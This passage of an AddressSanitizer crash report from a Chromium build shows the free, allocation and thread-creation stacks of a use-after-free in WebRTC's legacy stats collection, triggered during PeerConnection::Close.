freed by thread T9 (WebRTC_Signalin) here:
    #0 0x55555bd7f0d2 in operator delete(void*, unsigned long) (/home/user/chromium/src/out/asan-release/chrome+0x682b0d2) (BuildId: 7567412c12a003b9)
    #1 0x7fffdd33035f in webrtc::StatsCollection::ReplaceOrAddNew(webrtc::scoped_refptr<webrtc::StatsReport::IdBase> const&) third_party/webrtc/api/legacy_stats_types.cc:837:5
    #2 0x7fffdd6df882 in webrtc::LegacyStatsCollector::AddCertificateReports(std::__Cr::unique_ptr<webrtc::SSLCertificateStats, std::__Cr::default_delete<webrtc::SSLCertificateStats>>) third_party/webrtc/pc/legacy_stats_collector.cc:799:36
    #3 0x7fffdd6e0fd6 in webrtc::LegacyStatsCollector::ExtractSessionInfo_s(webrtc::LegacyStatsCollector::SessionStats&) third_party/webrtc/pc/legacy_stats_collector.cc:1058:11
    #4 0x7fffdd6dc874 in webrtc::LegacyStatsCollector::ExtractSessionAndDataInfo() third_party/webrtc/pc/legacy_stats_collector.cc:953:3
    #5 0x7fffdd6dbc43 in webrtc::LegacyStatsCollector::UpdateStats(webrtc::PeerConnectionInterface::StatsOutputLevel) third_party/webrtc/pc/legacy_stats_collector.cc:733:7
    #6 0x7fffdd53ce14 in webrtc::PeerConnection::Close() third_party/webrtc/pc/peer_connection.cc:1901:18
    #7 0x7fffdd43b959 in void absl::internal_any_invocable::LocalInvoker<false, void, webrtc::MethodCall<webrtc::PeerConnectionInterface, void>::Marshal(webrtc::Thread*)::'lambda'()&&>(absl::internal_any_invocable::TypeErasedState*) third_party/webrtc/pc/proxy.h:94:5
    #8 0x7fff8f20c203 in webrtc::ThreadWrapper::RunTaskQueueTask(absl::AnyInvocable<void () &&>) third_party/abseil-cpp/absl/functional/internal/any_invocable.h:774:1
    #9 0x7fff8f20eb5d in void base::internal::Invoker<base::internal::FunctorTraits<void (webrtc::ThreadWrapper::*&&)(absl::AnyInvocable<void () &&>), base::WeakPtr<webrtc::ThreadWrapper>&&, absl::AnyInvocable<void () &&>&&>, base::internal::BindState<true, true, false, void (webrtc::ThreadWrapper::*)(absl::AnyInvocable<void () &&>), base::WeakPtr<webrtc::ThreadWrapper>, absl::AnyInvocable<void () &&>>, void ()>::RunImpl<void (webrtc::ThreadWrapper::*)(absl::AnyInvocable<void () &&>), std::__Cr::tuple<base::WeakPtr<webrtc::ThreadWrapper>, absl::AnyInvocable<void () &&>>, 0ul, 1ul>(void (webrtc::ThreadWrapper::*&&)(absl::AnyInvocable<void () &&>), std::__Cr::tuple<base::WeakPtr<webrtc::ThreadWrapper>, absl::AnyInvocable<void () &&>>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul>) base/functional/bind_internal.h:740:12
    #10 0x7ffff6b60c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #11 0x7ffff6be216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #12 0x7ffff6be1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #13 0x7ffff6a033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #14 0x7ffff6be37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #15 0x7ffff6acb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #16 0x7ffff6c79832 in base::Thread::Run(base::RunLoop*) base/threading/thread.cc:361:13
    #17 0x7ffff6c79e02 in base::Thread::ThreadMain() base/threading/thread.cc:436:3
    #18 0x7ffff6cdde8c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #19 0x55555bd42616 in asan_thread_start(void*) asan_interceptors.cpp

previously allocated by thread T9 (WebRTC_Signalin) here:
    #0 0x55555bd7e4cd in operator new(unsigned long) (/home/user/chromium/src/out/asan-release/chrome+0x682a4cd) (BuildId: 7567412c12a003b9)
    #1 0x7fffdd330306 in webrtc::StatsCollection::ReplaceOrAddNew(webrtc::scoped_refptr<webrtc::StatsReport::IdBase> const&) third_party/webrtc/api/legacy_stats_types.cc
    #2 0x7fffdd6df882 in webrtc::LegacyStatsCollector::AddCertificateReports(std::__Cr::unique_ptr<webrtc::SSLCertificateStats, std::__Cr::default_delete<webrtc::SSLCertificateStats>>) third_party/webrtc/pc/legacy_stats_collector.cc:799:36
    #3 0x7fffdd6e0fd6 in webrtc::LegacyStatsCollector::ExtractSessionInfo_s(webrtc::LegacyStatsCollector::SessionStats&) third_party/webrtc/pc/legacy_stats_collector.cc:1058:11
    #4 0x7fffdd6dc874 in webrtc::LegacyStatsCollector::ExtractSessionAndDataInfo() third_party/webrtc/pc/legacy_stats_collector.cc:953:3
    #5 0x7fffdd6dbc43 in webrtc::LegacyStatsCollector::UpdateStats(webrtc::PeerConnectionInterface::StatsOutputLevel) third_party/webrtc/pc/legacy_stats_collector.cc:733:7
    #6 0x7fffdd53ce14 in webrtc::PeerConnection::Close() third_party/webrtc/pc/peer_connection.cc:1901:18
    #7 0x7fffdd43b959 in void absl::internal_any_invocable::LocalInvoker<false, void, webrtc::MethodCall<webrtc::PeerConnectionInterface, void>::Marshal(webrtc::Thread*)::'lambda'()&&>(absl::internal_any_invocable::TypeErasedState*) third_party/webrtc/pc/proxy.h:94:5
    #8 0x7fff8f20c203 in webrtc::ThreadWrapper::RunTaskQueueTask(absl::AnyInvocable<void () &&>) third_party/abseil-cpp/absl/functional/internal/any_invocable.h:774:1
    #9 0x7fff8f20eb5d in void base::internal::Invoker<base::internal::FunctorTraits<void (webrtc::ThreadWrapper::*&&)(absl::AnyInvocable<void () &&>), base::WeakPtr<webrtc::ThreadWrapper>&&, absl::AnyInvocable<void () &&>&&>, base::internal::BindState<true, true, false, void (webrtc::ThreadWrapper::*)(absl::AnyInvocable<void () &&>), base::WeakPtr<webrtc::ThreadWrapper>, absl::AnyInvocable<void () &&>>, void ()>::RunImpl<void (webrtc::ThreadWrapper::*)(absl::AnyInvocable<void () &&>), std::__Cr::tuple<base::WeakPtr<webrtc::ThreadWrapper>, absl::AnyInvocable<void () &&>>, 0ul, 1ul>(void (webrtc::ThreadWrapper::*&&)(absl::AnyInvocable<void () &&>), std::__Cr::tuple<base::WeakPtr<webrtc::ThreadWrapper>, absl::AnyInvocable<void () &&>>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul>) base/functional/bind_internal.h:740:12
    #10 0x7ffff6b60c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #11 0x7ffff6be216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #12 0x7ffff6be1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #13 0x7ffff6a033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #14 0x7ffff6be37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #15 0x7ffff6acb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #16 0x7ffff6c79832 in base::Thread::Run(base::RunLoop*) base/threading/thread.cc:361:13
    #17 0x7ffff6c79e02 in base::Thread::ThreadMain() base/threading/thread.cc:436:3
    #18 0x7ffff6cdde8c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #19 0x55555bd42616 in asan_thread_start(void*) asan_interceptors.cpp

Thread T9 (WebRTC_Signalin) created by T0 (chrome) here:
    #0 0x55555bd283d1 in pthread_create (/home/user/chromium/src/out/asan-release/chrome+0x67d43d1) (BuildId: 7567412c12a003b9)
    #1 0x7ffff6cdd54c in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThreadBase::Delegate*, base::PlatformThreadHandle*, base::ThreadType, base::MessagePumpType) base/threading/platform_thread_posix.cc:153:13
    #2 0x7ffff6c783b0 in base::Thread::StartWithOptions(base::Thread::Options) base/threading/thread.cc:228:26
    #3 0x7fff8e47273e in blink::PeerConnectionDependencyFactory::CreatePeerConnectionFactory() third_party/blink/renderer/modules/peerconnection/peer_connection_dependency_factory.cc:431:32
    #4 0x7fff8e4722ce in blink::PeerConnectionDependencyFactory::GetPcFactory() third_party/blink/renderer/modules/peerconnection/peer_connection_dependency_factory.cc:738:5
    #5 0x7fff8e47ad82 in blink::PeerConnectionDependencyFactory::CreatePeerConnection(webrtc::PeerConnectionInterface::RTCConfiguration const&, blink::WebLocalFrame*, webrtc::PeerConnectionObserver*, blink::ExceptionState&) third_party/blink/renderer/modules/peerconnection/peer_connection_dependency_factory.cc:1006:8
    #6 0x7fff8e54dd7e in blink::RTCPeerConnectionHandler::Initialize(blink::ExecutionContext*, webrtc::PeerConnectionInterface::RTCConfiguration const&, blink::WebLocalFrame*, blink::ExceptionState&) third_party/blink/renderer/modules/peerconnection/rtc_peer_connection_handler.cc:898:50
    #7 0x7fff8e5071f7 in blink::RTCPeerConnection::RTCPeerConnection(blink::ExecutionContext*, webrtc::PeerConnectionInterface::RTCConfiguration, bool, blink::ExceptionState&) third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.cc:688:23
    #8 0x7fff8e506668 in blink::RTCPeerConnection* blink::MakeGarbageCollected<blink::RTCPeerConnection, blink::ExecutionContext*&, webrtc::PeerConnectionInterface::RTCConfiguration, bool, blink::ExceptionState&>(blink::ExecutionContext*&, webrtc::PeerConnectionInterface::RTCConfiguration&&, bool&&, blink::ExceptionState&) v8/include/cppgc/allocation.h:239:32
    #9 0x7fff8e503beb in blink::RTCPeerConnection::Create(blink::ExecutionContext*, blink::RTCConfiguration const*, blink::ExceptionState&) third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.cc:611:40
    #10 0x7fff8cb11b6f in blink::(anonymous namespace)::v8_rtc_peer_connection::ConstructorCallback(v8::FunctionCallbackInfo<v8::Value> const&) gen/third_party/blink/renderer/bindings/modules/v8/v8_rtc_peer_connection.cc:674:23
    #11 0x7fff94403aea in v8::internal::FunctionCallbackArguments::CallOrConstruct(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::FunctionTemplateInfo>, bool) v8/src/api/api-arguments-inl.h:176:3
    #12 0x7fff944007fe in v8::internal::Builtin_Impl_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:117:27
    #13 0x7bfaffe7ff35  (<unknown module>)
    #14 0x7bfaffdcf169  (<unknown module>)
    #15 0x7bfafff894d7  (<unknown module>)
    #16 0x7bfaffdce83b  (<unknown module>)
    #17 0x7bfaffdce83b  (<unknown module>)
    #18 0x7bfaffdcb5db  (<unknown module>)
    #19 0x7bfaffdcb32a  (<unknown module>)
    #20 0x7fff9472461e in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/simulator.h:216:12
    #21 0x7fff94725b28 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #22 0x7fff942c0aca in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:2031:7
    #23 0x7fffa30f175d in blink::V8ScriptRunner::RunCompiledScript(v8::Isolate*, v8::Local<v8::Script>, v8::Local<v8::Data>, blink::ExecutionContext*) third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc:511:22
    #24 0x7fffa30f2ee2 in blink::V8ScriptRunner::CompileAndRunScript(blink::ScriptState*, blink::ClassicScript*, blink::ExecuteScriptPolicy, blink::V8ScriptRunner::RethrowErrorsOption) third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc:635:22
    #25 0x7fffa66a0aef in blink::ClassicScript::RunScriptOnScriptStateAndReturnValue(blink::ScriptState*, blink::ExecuteScriptPolicy, blink::V8ScriptRunner::RethrowErrorsOption) third_party/blink/renderer/core/script/classic_script.cc:227:10
    #26 0x7fffa6700848 in blink::Script::RunScriptOnScriptState(blink::ScriptState*, blink::ExecuteScriptPolicy, blink::V8ScriptRunner::RethrowErrorsOption) third_party/blink/renderer/core/script/script.cc:35:17
    #27 0x7fffa6700c07 in blink::Script::RunScript(blink::LocalDOMWindow*, blink::ExecuteScriptPolicy, blink::V8ScriptRunner::RethrowErrorsOption) third_party/blink/renderer/core/script/script.cc:42:3
    #28 0x7fffa66ffd1b in blink::PendingScript::ExecuteScriptBlockInternal(blink::Script*, blink::ScriptElementBase*, bool, bool, bool, base::TimeTicks, bool) third_party/blink/renderer/core/script/pending_script.cc:312:13
    #29 0x7fffa66fedd2 in blink::PendingScript::ExecuteScriptBlock() third_party/blink/renderer/core/script/pending_script.cc:209:3
    #30 0x7fffa67063fe in blink::ScriptLoader::PrepareScript(blink::ScriptLoader::ParserBlockingInlineOption, blink::TextPosition const&) third_party/blink/renderer/core/script/script_loader.cc:1175:60
    #31 0x7fffa66b4265 in blink::HTMLParserScriptRunner::ProcessScriptElementInternal(blink::Element*, blink::TextPosition const&) third_party/blink/renderer/core/script/html_parser_script_runner.cc:587:52
    #32 0x7fffa66b3a50 in blink::HTMLParserScriptRunner::ProcessScriptElement(blink::Element*, blink::TextPosition const&) third_party/blink/renderer/core/script/html_parser_script_runner.cc:297:3
    #33 0x7fffa72678ea in blink::HTMLDocumentParser::RunScriptsForPausedTreeBuilder() third_party/blink/renderer/core/html/parser/html_document_parser.cc:662:21
    #34 0x7fffa726414d in blink::HTMLDocumentParser::PumpTokenizer() third_party/blink/renderer/core/html/parser/html_document_parser.h:211:7
    #35 0x7fffa7262568 in blink::HTMLDocumentParser::PumpTokenizerIfPossible() third_party/blink/renderer/core/html/parser/html_document_parser.cc:625:15
    #36 0x7fffa72705a2 in blink::HTMLDocumentParser::FinishAppend() third_party/blink/renderer/core/html/parser/html_document_parser.cc:1028:5
    #37 0x7fffa7270c4c in blink::HTMLDocumentParser::CommitPreloadedData() third_party/blink/renderer/core/html/parser/html_document_parser.cc:1043:5
    #38 0x7fffa5f5a73a in blink::DocumentLoader::StartLoadingResponse() third_party/blink/renderer/core/loader/document_loader.cc:2138:14
    #39 0x7fffa5f690b9 in blink::DocumentLoader::CommitNavigation() third_party/blink/renderer/core/loader/document_loader.cc:3180:3
    #40 0x7fffa5fc4c4e in blink::FrameLoader::CommitDocumentLoader(blink::DocumentLoader*, blink::HistoryItem*, blink::CommitReason) third_party/blink/renderer/core/loader/frame_loader.cc:1450:21
    #41 0x7fffa5fcfef3 in blink::FrameLoader::CommitNavigation(std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>, std::__Cr::unique_ptr<blink::WebDocumentLoader::ExtraData, std::__Cr::default_delete<blink::WebDocumentLoader::ExtraData>>, blink::CommitReason) third_party/blink/renderer/core/loader/frame_loader.cc:1262:3
    #42 0x7fffa495abdb in blink::WebLocalFrameImpl::CommitNavigation(std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>, std::__Cr::unique_ptr<blink::WebDocumentLoader::ExtraData, std::__Cr::default_delete<blink::WebDocumentLoader::ExtraData>>) third_party/blink/renderer/core/frame/web_local_frame_impl.cc:2824:24
    #43 0x7fffec56153a in content::RenderFrameImpl::CommitNavigationWithParams(mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, std::__Cr::unique_ptr<content::DocumentState, std::__Cr::default_delete<content::DocumentState>>, std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>) content/renderer/render_frame_impl.cc:3001:11
    #44 0x7fffec5b66ae in void base::internal::DecayedFunctorTraits<void (content::RenderFrameImpl::*)(mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, std::__Cr::unique_ptr<content::DocumentState, std::__Cr::default_delete<content::DocumentState>>, std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>), base::WeakPtr<content::RenderFrameImpl>&&, mojo::StructPtr<blink::mojom::CommonNavigationParams>&&, mojo::StructPtr<blink::mojom::CommitNavigationParams>&&, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>&&, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>&&, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>&&, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>&&, mojo::PendingRemote<network::mojom::URLLoaderFactory>&&, mojo::PendingRemote<network::mojom::URLLoaderFactory>&&, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>&&, mojo::PendingRemote<blink::mojom::CodeCacheHost>&&, mojo::PendingRemote<blink::mojom::CodeCacheHost>&&, mojo::StructPtr<content::mojom::CookieManagerInfo>&&, mojo::StructPtr<content::mojom::StorageInfo>&&, std::__Cr::unique_ptr<content::DocumentState, std::__Cr::default_delete<content::DocumentState>>&&>::Invoke<void (content::RenderFrameImpl::*)(mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, std::__Cr::unique_ptr<content::DocumentState, std::__Cr::default_delete<content::DocumentState>>, std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>), base::WeakPtr<content::RenderFrameImpl> const&, mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, std::__Cr::unique_ptr<content::DocumentState, std::__Cr::default_delete<content::DocumentState>>, std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>>(void (content::RenderFrameImpl::*)(mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, std::__Cr::unique_ptr<content::DocumentState, std::__Cr::default_delete<content::DocumentState>>, std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>), base::WeakPtr<content::RenderFrameImpl> const&, mojo::StructPtr<blink::mojom::CommonNavigationParams>&&, mojo::StructPtr<blink::mojom::CommitNavigationParams>&&, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>&&, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>&&, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>&&, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>&&, mojo::PendingRemote<network::mojom::URLLoaderFactory>&&, mojo::PendingRemote<network::mojom::URLLoaderFactory>&&, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>&&, mojo::PendingRemote<blink::mojom::CodeCacheHost>&&, mojo::PendingRemote<blink::mojom::CodeCacheHost>&&, mojo::StructPtr<content::mojom::CookieManagerInfo>&&, mojo::StructPtr<content::mojom::StorageInfo>&&, std::__Cr::unique_ptr<content::DocumentState, std::__Cr::default_delete<content::DocumentState>>&&, std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>&&) base/functional/bind_internal.h:740:12
    #45 0x7fffec5b616f in base::internal::Invoker<base::internal::FunctorTraits<void (content::RenderFrameImpl::*&&)(mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, std::__Cr::unique_ptr<content::DocumentState, std::__Cr::default_delete<content::DocumentState>>, std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>), base::WeakPtr<content::RenderFrameImpl>&&, mojo::StructPtr<blink::mojom::CommonNavigationParams>&&, mojo::StructPtr<blink::mojom::CommitNavigationParams>&&, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>&&, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>&&, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>&&, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>&&, mojo::PendingRemote<network::mojom::URLLoaderFactory>&&, mojo::PendingRemote<network::mojom::URLLoaderFactory>&&, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>&&, mojo::PendingRemote<blink::mojom::CodeCacheHost>&&, mojo::PendingRemote<blink::mojom::CodeCacheHost>&&, mojo::StructPtr<content::mojom::CookieManagerInfo>&&, mojo::StructPtr<content::mojom::StorageInfo>&&, std::__Cr::unique_ptr<content::DocumentState, std::__Cr::default_delete<content::DocumentState>>&&>, base::internal::BindState<true, true, false, void (content::RenderFrameImpl::*)(mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, std::__Cr::unique_ptr<content::DocumentState, std::__Cr::default_delete<content::DocumentState>>, std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>), base::WeakPtr<content::RenderFrameImpl>, mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, std::__Cr::unique_ptr<blink::PendingURLLoaderFactoryBundle, std::__Cr::default_delete<blink::PendingURLLoaderFactoryBundle>>, std::__Cr::optional<std::__Cr::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>, std::__Cr::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader>>>>, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingAssociatedRemote<blink::mojom::FetchLaterLoaderFactory>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, std::__Cr::unique_ptr<content::DocumentState, std::__Cr::default_delete<content::DocumentState>>>, void (std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>)>::RunOnce(base::internal::BindStateBase*, std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>&&) base/functional/bind_internal.h:956:5
    #46 0x7fffec5625d5 in base::OnceCallback<void (std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>)>::Run(std::__Cr::unique_ptr<blink::WebNavigationParams, std::__Cr::default_delete<blink::WebNavigationParams>>) && base/functional/callback.h:155:12
